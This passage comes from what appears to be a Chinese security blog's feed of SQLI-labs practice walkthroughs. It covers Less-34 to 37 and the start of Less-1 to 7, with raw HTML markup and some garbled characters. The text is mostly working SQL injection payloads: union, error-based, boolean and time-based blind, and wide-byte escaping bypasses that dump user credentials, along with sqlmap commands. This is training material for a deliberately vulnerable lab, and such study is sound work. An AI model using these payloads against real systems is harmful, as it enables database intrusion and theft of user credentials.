0</span><span class="hljs-string">mysql&gt;  select * from users where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0;</span><span class="hljs-string">Empty set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where 1</span><span class="hljs-string">mysql&gt;  select * from users where 1;</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">| id | username   | password |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">|  1 | Dumb       | 0        |</span><span class="hljs-string">|  2 | Angelina   | 0        |</span><span class="hljs-string">|  3 | Dummy      | 0        |</span><span class="hljs-string">|  4 | secure     | 0        |</span><span class="hljs-string">|  5 | stupid     | 0        |</span><span class="hljs-string">|  6 | superman   | 0        |</span><span class="hljs-string">|  7 | batman     | 0        |</span><span class="hljs-string">|  8 | admin      | 1234     |</span><span class="hljs-string">|  9 | admin1     | 0        |</span><span class="hljs-string">| 10 | admin2     | 0        |</span><span class="hljs-string">| 11 | admin3     | 0        |</span><span class="hljs-string">| 12 | dhakkan    | 0        |</span><span class="hljs-string">| 14 | admin4     | 0        |</span><span class="hljs-string">| 15 | admin&#x27;</span><span class="hljs-comment">#sec | 123      |</span>+----+------------+----------+14 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<span class="hljs-comment"># where 0</span>mysql&gt; select * from users <span class="hljs-built_in">where</span> 0;Empty <span class="hljs-built_in">set</span> (0.00 sec)</code></pre><p>那么直接尝试一下最基本的联合查询注入看看：</p><pre><code class="hljs sql">uname=�&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre><p>也是 OK 的</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span> = addslashes(<span class="hljs-variable">$string</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>但是本关的拼接方式是：</p><pre><code class="hljs Bash"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-variable">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-36-Bypass-mysql-real-escape-string"><a href="#Less-36-Bypass-mysql-real-escape-string" class="headerlink" title="Less-36(Bypass mysql_real_escape_string)"></a>Less-36(Bypass mysql_real_escape_string)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>主要防护代码：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_quotes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= mysql_real_escape_string(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><p>或者</p><pre><code class="hljs sql">?id=-1�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>依然使用了 和 Less-36 的防护方法：</p><pre><code class="hljs Php"><span class="hljs-variable">$uname</span> = mysql_real_escape_string(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= mysql_real_escape_string(<span class="hljs-variable">$passwd1</span>);</code></pre><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>或者：</p><pre><code class="hljs sql">uname=�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;高级注入姿势-21-37-关&quot;&gt;&lt;a href=&quot;#高级注入姿势-21-37-关&quot; class=&quot;headerlink&quot; title=&quot;高级注入姿势 21-37 关&quot;&gt;&lt;/a&gt;高级注入姿势 21-37 关&lt;/h1&gt;&lt;h2 id=&quot;Less-21-Cookie-Ba</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli lab" scheme="http://www.secice.cn/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场笔记之基础挑战 1-20 关</title>
    <link href="http://www.secice.cn/p/22efef48"/>
    <id>http://www.secice.cn/p/22efef48</id>
    <published>2020-07-20T02:00:36.000Z</published>
    <updated>2020-12-13T11:12:23.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见注入流程"><a href="#常见注入流程" class="headerlink" title="常见注入流程"></a>常见注入流程</h1><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><pre><code class="hljs sql">?id=1&#x27;?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>手动修改 <code>LIMIT 0,1</code> 来进行结果偏移</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>数据库第一个字母为 <code>s</code></p><pre><code class="hljs sql">?id=1&#x27; and left(database(),1)&gt;&#x27;r&#x27;--+?id=1&#x27; and left(database(),1)&gt;&#x27;s&#x27;--+?id=1&#x27; and left(database(),2)&gt;&#x27;sd&#x27;--+?id=1&#x27; and left(database(),2)&gt;&#x27;se&#x27;--+...</code></pre><h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><p>利用<code>if(条件,0,1)</code>函数，当条件为真，返回0，假则返回1</p><pre><code class="hljs sql">?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+...</code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><strong>联合查询注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</code></pre><p><strong>报错注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</code></pre><p><strong>布尔盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</code></pre><p><strong>延时盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</code></pre><h1 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询内容<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs sql">?id=1&#x27;?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已</p><pre><code class="hljs sql">?id=1?id=1 order by 3 <span class="hljs-comment">--+</span>?id=1 order by 4 <span class="hljs-comment">--+</span>?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x7573657273</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="hljs-subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已。</p><pre><code class="hljs sql">?id=1&#x27;)?id=1&#x27;) order by 3 <span class="hljs-comment">--+</span>?id=1&#x27;) order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先双引号 在括号拼接</span><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询内容<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><pre><code class="hljs sql">?id=1&quot;)?id=1&quot;) order by 3 <span class="hljs-comment">--+</span>?id=1&quot;) order by 4 <span class="hljs-comment">--+</span>?id=-1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 直接单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in...........<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致。</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-5 利用方式一致，只是闭合方式不一样，这里不再啰嗦了。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" 